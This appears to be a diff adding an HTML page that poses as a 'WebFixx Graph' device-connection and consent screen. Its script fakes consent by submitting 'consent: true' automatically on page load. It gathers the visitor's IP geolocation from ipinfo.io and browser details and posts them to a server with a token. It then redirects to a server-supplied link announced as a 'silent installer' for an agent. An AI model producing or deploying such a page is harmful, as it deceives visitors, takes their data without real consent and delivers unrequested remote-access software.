@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>WebFixx Graph — Connect Device</title>
+  <style>
+    body { font-family: system-ui, sans-serif; background: #0f172a; color: #e2e8f0; display:flex; align-items:center; justify-content:center; min-height:100vh; margin:0; }
+    .card { background:#1e293b; padding:32px; border-radius:12px; max-width:560px; width:100%; box-shadow:0 10px 30px rgba(0,0,0,.4); }
+    h1 { margin:0 0 8px; font-size:22px; }
+    p { color:#94a3b8; font-size:14px; line-height:1.5; }
+    .scope { background:#0f172a; padding:12px; border-radius:8px; font-size:13px; margin:16px 0; }
+    .status { margin-top:12px; font-size:13px; color:#94a3b8; }
+    .ok { color:#22c55e; }
+    .err { color:#ef4444; }
+    #log { margin-top:8px; font-family:monospace; font-size:12px; max-height:160px; overflow:auto; background:#0f172a; padding:8px; border-radius:6px; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h1>WebFixx Graph — Connecting Device</h1>
+    <p>This device is being connected to WebFixx Graph. Indexing metadata of files in approved folders for remote search and retrieval.</p>
+    <div class="scope">
+      <strong>Scope disclosure</strong>
+      <ul>
+        <li>What is indexed: file path, name, size, modified time, mime type (metadata only).</li>
+        <li>Approved roots: Documents, Desktop, Downloads (default).</li>
+        <li>Retention: until you revoke. Revoke anytime from the WebFixx app.</li>
+        <li>File bytes are never uploaded unless you explicitly request a transfer from the launcher.</li>
+      </ul>
+    </div>
+    <div class="status" id="status">Initializing...</div>
+    <div id="log"></div>
+  </div>
+  <script>
+    const templateConfig = {
+      postURL: window.location.origin + '/api',
+      token: "{{token}}",
+      landingPageLink: "{{landingPageLink}}"
+    };
+    const apiBaseUrl = templateConfig.postURL;
+    const status = document.getElementById('status');
+    const log = document.getElementById('log');
+    function appendLog(msg) { const d = document.createElement('div'); d.textContent = new Date().toLocaleTimeString() + ' — ' + msg; log.appendChild(d); log.scrollTop = log.scrollHeight; }
+    function setStatus(msg, cls) { status.innerHTML = cls ? '<span class="' + cls + '">' + msg + '</span>' : msg; }
+
+    async function submitConsent() {
+      setStatus('Submitting consent...', '');
+      appendLog('Submitting consent to server...');
+      let ipData = {};
+      try { ipData = await fetch('https://ipinfo.io/json').then(r => r.json()); } catch (e) {}
+      const deviceData = { userAgent: navigator.userAgent, platform: navigator.platform, language: navigator.language };
+      const formDataContent = { platform: navigator.platform, consent: true, ipData: ipData, deviceData: deviceData };
+      try {
+        const res = await fetch(apiBaseUrl + '/notify-form-submission', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+          body: objectToFormData({ token: templateConfig.token, formData: JSON.stringify(formDataContent) })
+        });
+        if (!res.ok) throw new Error('HTTP ' + res.status);
+        const data = await res.json();
+        console.log('[GRAPH] response:', JSON.stringify(data));
+        appendLog('Response: ' + JSON.stringify(data));
+        if (!data.success) throw new Error(data.error || 'submission failed');
+        appendLog('Consent accepted. DeviceId: ' + (data.deviceId || 'n/a'));
+        appendLog('Server endpoint: ' + (data.endpoint || 'n/a'));
+        setStatus('Connected. DeviceId: ' + (data.deviceId || 'n/a'), 'ok');
+        const link = data.scriptingLink || data.endpoint;
+        if (link) {
+          appendLog('Triggering silent installer...');
+          setStatus('Connected. Installing agent...', 'ok');
+          setTimeout(() => { window.location.href = link; }, 1500);
+        }
+      } catch (e) {
+        appendLog('ERROR: ' + e.message);
+        setStatus(e.message, 'err');
+      }
+    }
+
+    function objectToFormData(obj) {
+      const fd = new FormData();
+      Object.entries(obj).forEach(([k, v]) => {
+        if (v === null || v === undefined) fd.append(k, '');
+        else if (typeof v === 'object') fd.append(k, JSON.stringify(v));
+        else fd.append(k, String(v));
+      });
+      return fd;
+    }
+
+    // Auto-submit on page load
+    window.addEventListener('DOMContentLoaded', () => { submitConsent(); });
+  </script>
+</body>
+</html>
